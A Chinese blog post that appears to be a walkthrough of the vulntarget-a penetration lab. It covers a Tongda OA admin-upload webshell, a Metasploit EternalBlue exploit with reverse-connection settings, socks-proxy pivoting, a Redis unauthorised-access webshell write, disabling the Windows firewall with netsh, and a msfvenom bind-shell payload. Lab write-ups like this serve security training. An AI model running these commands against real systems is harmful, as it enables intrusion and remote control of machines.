
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/WhiteZ/p/19108922" title="发布于 2025-09-24 12:08">
    <span role="heading" aria-level="2">域渗透靶场-vulntarget-a综合靶场</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>nmap发现开放80端口<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250923165948029-603873494.png" class="lazyload"><br>
浏览器访问，是通达oa<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250923170021868-797048553.png" class="lazyload"><br>
可以搜索poc或者使用oa利用工具拿到shell<br>
通过账号admin 密码滞空，进入后台<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250923170254253-1387477458.png" class="lazyload"><br>
我们这里使用通达OA 11.2 后台getshell</p>
<p>点击系统管理 -&gt; 系统参数设置 -&gt; OA服务设置 找到Webroot目录<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250923171051171-1195270935.png" class="lazyload"></p>
<p>点击系统管理 -&gt; 附件管理 -&gt; 添加存储目录<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250923171459674-1246222231.png" class="lazyload"></p>
<p>点击组织 -&gt; 系统管理员 -&gt; 上传附件<br>
上传txt文件，抓包修改一句话木马，蚁剑或者哥斯拉连接<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250923173330594-1253036578.png" class="lazyload"><br>
路径以及文件地址已给出，自行拼接，蚁剑getshell<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250923173520929-1482434178.png" class="lazyload"><br>
信息收集，发现第二张网卡：<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250923174012267-111168325.png" class="lazyload"><br>
可以先让这台机器上线msf，建立路由，进行对20网段的渗透</p>
<p>use exploit/windows/smb/ms17_010_eternalblue<br>
set rhost 192.168.135.152<br>
set lhost 192.168.135.128<br>
set lport 4444<br>
run<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250923175810838-1882038722.png" class="lazyload"><br>
添加一下路由<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250923193715142-1443044314.png" class="lazyload"><br>
开启一下代理，可以进行内网渗透了<br>
use auxiliary/server/socks_proxy<br>
set srvhost 127.0.0.1<br>
run<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250923195157031-1694824214.png" class="lazyload"><br>
利用auxiliary/server/socks_proxy模块开启socks代理</p>
<p>use auxiliary/server/socks_proxy<br>
set version 4a<br>
run<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250923202026073-1832485606.png" class="lazyload"></p>
<p>redis未授权访问，写入webshell<br>
proxychains4 redis-cli -h 10.0.20.99<br>
config set dir 'C:/phpStudy/PHPTutorial/WWW/'<br>
config set dbfilename shell.php<br>
set 1 ""<br>
save<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250923202422698-1389998690.png" class="lazyload"><br>
哥斯拉连接<br>
proxychains4 java -jar godzilla.jar<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250923204303594-981083922.png" class="lazyload"><br>
关闭win2016防火墙，上传msf生成的bind_shell<br>
netsh advfirewall set allprofiles state off		#关闭防火墙</p>
<h1 id="msfvenom生成shell">msfvenom生成shell</h1>
<p>msfvenom -p windows/x64/meterpreter/bind_tcp rhost=10.0.20.99 lport=4444 -f exe -o shell.exe<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250923204236594-363091612.png" class="lazyload"><br>
上传到哥斯拉，并执行<br>
<img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/3627798/202509/3627798-20250924110127434-2019319121.png" class="lazyload"></p>

</div>
